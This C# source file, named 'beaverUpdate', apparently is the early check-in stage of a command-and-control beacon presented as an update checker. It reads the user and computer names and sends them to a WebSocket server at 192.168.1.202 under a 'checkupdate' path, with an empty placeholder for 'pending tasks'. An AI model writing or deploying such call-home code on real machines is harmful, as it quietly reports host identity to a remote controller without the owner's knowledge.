using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.WebSockets;

namespace beaverUpdate
{
    internal class Program
    {
        static int timerail = 10;
        static async Task Main(string[] args)
        {
            // Ensure we're tracking state
            DatabaseHelper.EnsureTablesExist();

            // Check if the fruit is ripe yet
            DateTime lastRun = DatabaseHelper.GetLastRunTimestamp();
            DatabaseHelper.LogRunEvent();
            if (lastRun != DateTime.Now && DateTime.Now - lastRun < TimeSpan.FromSeconds(timerail))
            {
                Console.WriteLine($"Last run was less than {timerail} seconds ago.");
                return;
            }

            // Say hello to mother. 
            Console.WriteLine("Hello mother!");
            HostInfo hostInfo = GetHostInfo();
            Console.WriteLine($"Greetings {hostInfo.UserName} from {hostInfo.ComputerName}");
            await SendMessage("bugz", $"Greetings from {hostInfo.UserName} on {hostInfo.ComputerName}!");

            // Start working through pending tasks

        }

        // supplementary
        static HostInfo GetHostInfo()
        {
            string ComputerName = Environment.GetEnvironmentVariable("COMPUTERNAME");
            string UserName = Environment.GetEnvironmentVariable("USERNAME");
            return new HostInfo(ComputerName, UserName);
        }

        class HostInfo
        {
            public string ComputerName { get; set; }
            public string UserName { get; set; }

            public HostInfo(string computerName, string userName)
            {
                ComputerName = computerName;
                UserName = userName;
            }
        }

        static async Task SendMessage(string clientName, string message)
        {
            using (ClientWebSocket webSocket = new ClientWebSocket())
            {

                Uri serverUri = new Uri($"ws://192.168.1.202/checkupdate?client={clientName}");
                try
                {
                    await webSocket.ConnectAsync(serverUri, CancellationToken.None);
                    Console.WriteLine("Connected to WebSocket server.");

                    // Create the JSON payload for the "update" event
                    string jsonPayload = $"{{\"event\": \"message\", \"message\": \"{message}\"}}";
                    byte[] sendBuffer = Encoding.UTF8.GetBytes(jsonPayload);

                    // Send the message to the WebSocket server
                    await webSocket.SendAsync(new ArraySegment<byte>(sendBuffer), WebSocketMessageType.Text, true, CancellationToken.None);
                    Console.WriteLine("Sent 'message' event with message 'check-in'.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }
    }    
}
